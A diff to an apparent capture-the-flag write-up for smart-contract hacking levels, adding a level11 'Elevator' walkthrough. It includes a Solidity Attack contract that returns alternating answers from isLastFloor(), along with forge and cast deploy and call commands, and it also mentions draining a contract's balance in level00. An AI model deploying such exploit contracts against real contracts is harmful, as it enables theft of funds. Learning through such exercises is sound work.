@@ -42,7 +42,7 @@ forge script ./script/level00.s.sol broadcast -vvvv --rpc-url $RPC_URL --private
 
 1. our main goal here is to be the owner and drain the contract balance, we can do this by two ways
    1. either keep contributing using contribute() to make your contribution
-      more then the current owner and use withdraw() which is not a feasible
+      more than the current owner and use withdraw() which is not a feasible
       solution obvi.
    2. or we can use the receive() fun. where we need to fulfill two basic conditions, msg.value>0 and contibutions[msg.sender]>0 , which is
       comparatively easy, then use withdraw(), so proceeding with this option
@@ -309,3 +309,58 @@ cast send $DEPLOYED_ADDRESS "attack()" --value 0.001ether --rpc-url $RPC_URL --p
 ```
 
 6. once it's done u can submit the instance.
+
+## level11 - Elevator
+
+1. the objective for this level is to reach the top floor or set top to true, we can see Elevator contract uses a Building interface which uses the address of msg.sender(aka. us) indicating we need to write implementation code for the interface.
+
+2. to satisfy the condition for if block we need "building.isLastFloor(\_floor)" to return false cuz there's a negation in front of it and then to return true in second call as we need to set top to true.
+
+3. so we'll create a contract with given code in src
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "../instances/Ilevel11.sol";
+
+contract Attack {
+    Elevator elevator;
+    bool isTopFloor = false;
+
+    constructor(address _elevator) {
+        elevator = Elevator(_elevator);
+    }
+
+    function attack() public {
+        elevator.goTo(10);
+    }
+
+    function isLastFloor(uint256 _floor) external returns (bool) {
+        bool swtich = isTopFloor;
+        isTopFloor = !isTopFloor;
+        return swtich;
+    }
+}
+```
+
+```
+forge create src/level11.sol:Attack --constructor-args $LEVEL_ADDRESS --rpc-url $RPC_URL --private-key $PKEY
+```
+
+3. after deployment we'll make a call to our "attack()" function which will call the "goTo()" function internally and when goTo() makes the call to isLastFloor() it will return false in first go as we're setting switch to false for first time and then negating it to true for second call.
+
+```
+cast send $DEPLOYED_ADDRESS "attack()" --rpc-url $RPC_URL --private-key $PKEY
+```
+
+4. u can check if top was updated using this command
+
+```
+cast call $LEVEL_ADDRESS "top()" --rpc-url $RPC_URL --private-key $PKEY
+```
+
+if return value is 1 means top is set to true.
+
+5. go on submit the instance, u're done.
